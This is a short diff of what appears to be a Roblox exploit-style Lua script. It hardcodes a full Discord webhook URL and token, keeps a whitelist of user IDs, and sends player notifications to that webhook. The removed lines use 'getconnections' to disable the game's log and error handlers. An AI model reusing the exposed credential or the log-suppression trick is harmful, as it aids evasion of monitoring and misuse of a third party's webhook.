@@ -1,20 +1,7 @@
-for _,v in ipairs(getconnections(game:GetService("LogService").MessageOut)) do
-    v:Disable()
-end
-
-for _,v in ipairs(getconnections(game:GetService("ScriptContext").Error)) do
-    v:Disable()
-end
-
 local httpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1145852662567411782/4fCIj4OPmvc8x0qaEagNGxAc9U2eK8BTvLKuwJ8aE_UXv16yLETR0jkdT4YPwqgqAeNy"
 
 local authorizedUsers = {
-    1073008783,
-    4097678626,
-    5376557933,
-    5542746667,
-    4063116613,
     2389051392,
     123456789,
     987654321
@@ -67,7 +54,8 @@ local function sendWebhookNotification(player)
     end)
     
     if success then
-        print(response)
+        print("Webhook sent successfully.")
+        print("Response:", response)
     else
         warn("Error sending webhook notification:", response)
     end
